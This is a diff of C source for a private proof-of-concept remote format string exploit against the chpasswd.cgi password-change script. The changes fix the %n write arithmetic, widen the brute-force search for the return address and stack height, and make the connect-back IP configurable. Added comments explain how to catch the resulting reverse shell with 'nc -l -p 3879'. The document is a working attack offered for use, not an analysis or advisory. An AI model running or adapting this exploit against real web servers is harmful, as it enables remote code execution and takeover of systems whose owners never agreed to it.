@@ -1,18 +1,36 @@
 /*
- * Proof of concept chpasswd.cgi remote format string exploit
- * by skylazart/dm_
+ * PROOF OF CONCEPT CHPASSWD.CGI REMOTE FORMAT STRING EXPLOIT
+ * Reference: http://sarg.sourceforge.net/chpasswd.php
+ *
+ * by skylazart
  * 28/11/2008
  *
- * PRIVATE -*- PRIVATE -*- PRIVATE -*- PRIVATE
+ * Thanks savio|dm_@xored 
+ *
+ * PRIVATE, DO NOT DISTRIBUTE!!!
  */
 
 
+
+
 /*
- * First relase TODO:
+ * Running:
  * 
- * Final exploitation;
+ * First: change MY_IP to your ip address to receive to connect back shell to port 3879
  *
- * Make all variables as parameters;
+ * ./lschpasswdfmt <target>
+ * 
+ * Using another terminal, just use nc to receive the connect back shell
+ * 
+ * nc -vvv -l -p 3879
+ */
+
+
+
+
+/*
+ * TODO: Support FreeBSD and OpenBSD targets;
+ *       Finish net.[ch] library to release with this exploit;
  */
 
 
@@ -25,6 +43,9 @@
 #include <time.h>
 
 #include "net.h"
+
+
+#define MY_IP "127.0.0.1"
 
 
 #define DEFAULT_CHPASSWD_CGI_PATH "/cgi-bin/chpasswd.cgi"
@@ -277,7 +298,7 @@ brute_force_return_address (char *buffer, int maxlen, int align, int stack_heigh
 	int format_string_out_len;
 
 	char tmpbuffer[128];
-	
+
 	for (i = 0; i < 4; i++) {
 		format_u_value[i] = 12;
 	}
@@ -322,11 +343,13 @@ brute_force_return_address (char *buffer, int maxlen, int align, int stack_heigh
 	higher_32bits = (shellcode_addr & 0xff000000) >> 24;
 
 	
+	printf ("DEBUG: %02x %02x %02x %02x\n", higher_32bits, lower_32bits, higher_16bits, lower_16bits);
+
 	format_string_out_len = msg13_length + align + (8 * 4) + (8 * stack_height) + 1 + 12;
 	
 
 	/* lower 16 bits */
-	if (format_string_out_len > lower_16bits) {
+	while (lower_16bits < format_string_out_len) {
 		lower_16bits += 0x100;
 	}
 
@@ -334,8 +357,8 @@ brute_force_return_address (char *buffer, int maxlen, int align, int stack_heigh
 
 
 	/* higher 16 bits */
-	format_string_out_len = format_u_value[0];	
-	if (format_string_out_len > higher_16bits) {
+	format_string_out_len += format_u_value[0];	
+	while (higher_16bits < format_string_out_len) {
 		higher_16bits += 0x100;
 	}
 
@@ -343,23 +366,27 @@ brute_force_return_address (char *buffer, int maxlen, int align, int stack_heigh
 
 
 	/* lower 32 bits */
-	format_string_out_len = format_u_value[1];	
-	if (format_string_out_len > lower_32bits) {
+	format_string_out_len += format_u_value[1];
+	while (lower_32bits < format_string_out_len) {
 		lower_32bits += 0x100;
 	}
-
+	
 	format_u_value[2] += (lower_32bits - format_string_out_len);
 
+
 	/* higher 32 bits */
-	format_string_out_len = format_u_value[2];	
-	if (format_string_out_len > higher_32bits) {
+	format_string_out_len += format_u_value[2];	
+	while (higher_32bits < format_string_out_len) {
 		higher_32bits += 0x100;
 	}
 
 	format_u_value[3] += (higher_32bits - format_string_out_len);	
 
 
+	/* Creating the format string */
+
 	snprintf (tmpbuffer, sizeof (tmpbuffer), "|%%%du%%n%%%du%%n%%%du%%n%%%du%%n|", format_u_value[0], format_u_value[1], format_u_value[2], format_u_value[3]);
+
 
 	strncat (buffer, tmpbuffer, maxlen);
 	strncat (buffer, "&old_pw=f&new_pw1=lalalele&new_pw2=lalalele&change=Altere+minha+senha&", maxlen);
@@ -381,7 +408,7 @@ brute_force_return_address (char *buffer, int maxlen, int align, int stack_heigh
 	}
 	
 
-	*(long *) ptr = inet_addr ("65.19.178.5");
+	*(long *) ptr = inet_addr (MY_IP);
 
 	save_result_raw (buffer, strlen (buffer));
 	
@@ -526,7 +553,8 @@ main (int argc, char ** argv)
 	int found;
 
 	unsigned int expect_shellcode_addr = 0xbfffffff;
-	unsigned int expect_return_addr = 0xbfffffff;
+	unsigned int expect_return_addr = 0xbffffcff;
+
 
 	int step = -128;
 
@@ -638,7 +666,7 @@ main (int argc, char ** argv)
 		stack_height++;
 
 
-		if (stack_height > 20) {
+		if (stack_height > 200) {
 			break;
 		}
 	} while (found == 0);
@@ -749,10 +777,9 @@ main (int argc, char ** argv)
 
 
 
-	step = -128;
-
+	step = -1;
 	total_return_addr_retries = 0;
-	//expect_return_addr = 0x0804ffff;
+
 
 	for (;;) {
 		if ((expect_return_addr & 0xff000000) >>24 == 0 ||
